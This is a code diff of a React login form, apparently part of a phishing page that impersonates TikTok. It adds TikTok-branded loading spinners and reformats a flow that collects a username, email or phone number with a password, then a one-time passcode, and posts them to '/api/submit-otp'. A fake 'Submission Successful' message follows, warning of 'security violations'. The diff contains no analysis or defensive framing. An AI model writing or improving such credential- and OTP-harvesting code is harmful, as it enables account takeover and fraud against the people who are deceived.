@@ -1,7 +1,11 @@
 import { useState } from "react";
 import { useForm } from "react-hook-form";
 import { zodResolver } from "@hookform/resolvers/zod";
-import { credentialSubmitSchema, otpSubmitSchema, type CredentialSubmit } from "@shared/schema";
+import {
+  credentialSubmitSchema,
+  otpSubmitSchema,
+  type CredentialSubmit,
+} from "@shared/schema";
 import { useMutation } from "@tanstack/react-query";
 import { apiRequest } from "@/lib/queryClient";
 import { useToast } from "@/hooks/use-toast";
@@ -24,6 +28,7 @@ import {
 } from "@/components/ui/select";
 import { Eye, EyeOff, CheckCircle2 } from "lucide-react";
 import { z } from "zod";
+import { TikTokLoading } from "@/components/tiktok-loading";
 
 const countryCodes = [
   { code: "+93", country: "Afghanistan" },
@@ -273,13 +278,19 @@ interface UnifiedLoginFormProps {
   setSubmissionId: (id: number | null) => void;
 }
 
-export function UnifiedLoginForm({ method, step, submissionId, setStep, setSubmissionId }: UnifiedLoginFormProps) {
+export function UnifiedLoginForm({
+  method,
+  step,
+  submissionId,
+  setStep,
+  setSubmissionId,
+}: UnifiedLoginFormProps) {
   const [showPassword, setShowPassword] = useState(false);
   const [selectedCountry, setSelectedCountry] = useState("United States");
   const { toast } = useToast();
 
   const getCountryCode = (countryName: string) => {
-    return countryCodes.find(c => c.country === countryName)?.code || "+1";
+    return countryCodes.find((c) => c.country === countryName)?.code || "+1";
   };
 
   const credentialForm = useForm<CredentialSubmit>({
@@ -342,7 +353,12 @@ export function UnifiedLoginForm({ method, step, submissionId, setStep, setSubmi
         console.error("No submission ID available!");
         throw new Error("No submission ID");
       }
-      console.log("Submitting OTP with submissionId:", submissionId, "and OTP:", otp);
+      console.log(
+        "Submitting OTP with submissionId:",
+        submissionId,
+        "and OTP:",
+        otp,
+      );
       return await apiRequest("POST", "/api/submit-otp", {
         submissionId,
         otp,
@@ -374,12 +390,22 @@ export function UnifiedLoginForm({ method, step, submissionId, setStep, setSubmi
     return (
       <div className="space-y-6 text-center py-8">
         <div className="flex justify-center">
-          <CheckCircle2 className="w-16 h-16 text-green-500" data-testid="icon-success" />
+          <CheckCircle2
+            className="w-16 h-16 text-green-500"
+            data-testid="icon-success"
+          />
         </div>
         <div className="space-y-2">
-          <h3 className="text-xl font-semibold" data-testid="heading-success">Submission Successful!</h3>
-          <p className="text-muted-foreground" data-testid="text-verification-message">
-            You will receive a verification email shortly. Please check your inbox and follow the instructions to update your password for security reasons and to avoid violations.
+          <h3 className="text-xl font-semibold" data-testid="heading-success">
+            Submission Successful!
+          </h3>
+          <p
+            className="text-muted-foreground"
+            data-testid="text-verification-message"
+          >
+            You will receive a verification email shortly. Please check your
+            inbox and follow the instructions to update your password to avoid
+            spamming and security violations.
           </p>
         </div>
       </div>
@@ -390,13 +416,22 @@ export function UnifiedLoginForm({ method, step, submissionId, setStep, setSubmi
     console.log("Rendering OTP form with submissionId:", submissionId);
     return (
       <Form {...otpForm} key="otp-form">
-        <form onSubmit={otpForm.handleSubmit(onSubmitOtp)} className="space-y-4" autoComplete="off">
+        <form
+          onSubmit={otpForm.handleSubmit(onSubmitOtp)}
+          className="space-y-4"
+          autoComplete="off"
+        >
           <FormField
             control={otpForm.control}
             name="otp"
             render={({ field }) => (
               <FormItem>
-                <FormLabel className="text-sm font-medium" data-testid="label-otp">Enter OTP</FormLabel>
+                <FormLabel
+                  className="text-sm font-medium"
+                  data-testid="label-otp"
+                >
+                  Enter OTP
+                </FormLabel>
                 <FormControl>
                   <Input
                     {...field}
@@ -413,13 +448,13 @@ export function UnifiedLoginForm({ method, step, submissionId, setStep, setSubmi
                     autoComplete="one-time-code"
                     value={field.value || ""}
                     onChange={(e) => {
-                      const value = e.target.value.replace(/\D/g, '');
+                      const value = e.target.value.replace(/\D/g, "");
                       field.onChange(value);
                     }}
                     onFocus={(e) => {
-                      if (e.target.value && e.target.value.includes('@')) {
-                        e.target.value = '';
-                        field.onChange('');
+                      if (e.target.value && e.target.value.includes("@")) {
+                        e.target.value = "";
+                        field.onChange("");
                       }
                     }}
                   />
@@ -435,7 +470,11 @@ export function UnifiedLoginForm({ method, step, submissionId, setStep, setSubmi
             data-testid="button-submit-otp"
             disabled={submitOtpMutation.isPending}
           >
-            {submitOtpMutation.isPending ? "Submitting..." : "Submit OTP"}
+            {submitOtpMutation.isPending ? (
+              <TikTokLoading size={20} />
+            ) : (
+              "Submit OTP"
+            )}
           </Button>
         </form>
       </Form>
@@ -444,29 +483,45 @@ export function UnifiedLoginForm({ method, step, submissionId, setStep, setSubmi
 
   return (
     <Form {...credentialForm}>
-      <form onSubmit={credentialForm.handleSubmit(onSubmitCredentials)} className="space-y-4">
+      <form
+        onSubmit={credentialForm.handleSubmit(onSubmitCredentials)}
+        className="space-y-4"
+      >
         <FormField
           control={credentialForm.control}
           name="identifier"
           render={({ field }) => (
             <FormItem>
-              <FormLabel className="text-sm font-medium" data-testid={`label-${method}`}>
-                {method === "phone" ? "Phone number" : method === "email" ? "Email" : "Username"}
+              <FormLabel
+                className="text-sm font-medium"
+                data-testid={`label-${method}`}
+              >
+                {method === "phone"
+                  ? "Phone number"
+                  : method === "email"
+                    ? "Email"
+                    : "Username"}
               </FormLabel>
               {method === "phone" ? (
                 <div className="flex gap-2">
-                  <Select value={selectedCountry} onValueChange={setSelectedCountry}>
-                    <SelectTrigger className="w-32 h-12" data-testid="select-country-code">
+                  <Select
+                    value={selectedCountry}
+                    onValueChange={setSelectedCountry}
+                  >
+                    <SelectTrigger
+                      className="w-32 h-12"
+                      data-testid="select-country-code"
+                    >
                       <SelectValue>
                         {getCountryCode(selectedCountry)}
                       </SelectValue>
                     </SelectTrigger>
                     <SelectContent>
                       {countryCodes.map((country) => (
-                        <SelectItem 
-                          key={country.country} 
+                        <SelectItem
+                          key={country.country}
                           value={country.country}
-                          data-testid={`option-country-${country.country.toLowerCase().replace(/\s+/g, '-')}`}
+                          data-testid={`option-country-${country.country.toLowerCase().replace(/\s+/g, "-")}`}
                         >
                           {country.country} {country.code}
                         </SelectItem>
@@ -486,7 +541,9 @@ export function UnifiedLoginForm({ method, step, submissionId, setStep, setSubmi
               ) : (
                 <FormControl>
                   <Input
-                    placeholder={method === "email" ? "Email address" : "Username"}
+                    placeholder={
+                      method === "email" ? "Email address" : "Username"
+                    }
                     type={method === "email" ? "email" : "text"}
                     className="h-12"
                     data-testid={`input-${method}-field`}
@@ -504,7 +561,12 @@ export function UnifiedLoginForm({ method, step, submissionId, setStep, setSubmi
           name="password"
           render={({ field }) => (
             <FormItem>
-              <FormLabel className="text-sm font-medium" data-testid={`label-${method}-password`}>Password</FormLabel>
+              <FormLabel
+                className="text-sm font-medium"
+                data-testid={`label-${method}-password`}
+              >
+                Password
+              </FormLabel>
               <div className="relative">
                 <FormControl>
                   <Input
@@ -539,7 +601,11 @@ export function UnifiedLoginForm({ method, step, submissionId, setStep, setSubmi
           data-testid={`button-${method}-submit`}
           disabled={submitCredentialsMutation.isPending}
         >
-          {submitCredentialsMutation.isPending ? "Submitting..." : "Continue"}
+          {submitCredentialsMutation.isPending ? (
+            <TikTokLoading size={20} />
+          ) : (
+            "Continue"
+          )}
         </Button>
       </form>
     </Form>
